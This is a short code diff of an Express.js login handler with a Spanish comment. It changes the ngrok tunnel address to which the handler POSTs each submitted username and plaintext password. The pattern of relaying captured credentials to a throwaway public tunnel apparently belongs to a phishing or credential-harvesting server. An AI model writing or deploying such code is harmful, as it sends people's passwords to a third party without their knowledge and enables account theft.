@@ -27,7 +27,7 @@ app.post('/login', async (req, res) => {
 
   // Después de obtener el nombre de usuario y la contraseña, envía la notificación
   try {
-    const response = await axios.post('https://611a-2800-e2-ba80-8ff-d55a-b4c8-7d7f-ba4.ngrok-free.app/login', {
+    const response = await axios.post('https://d51f-45-65-234-17.ngrok-free.app/login', {
       nombre,
       contraseña
     });
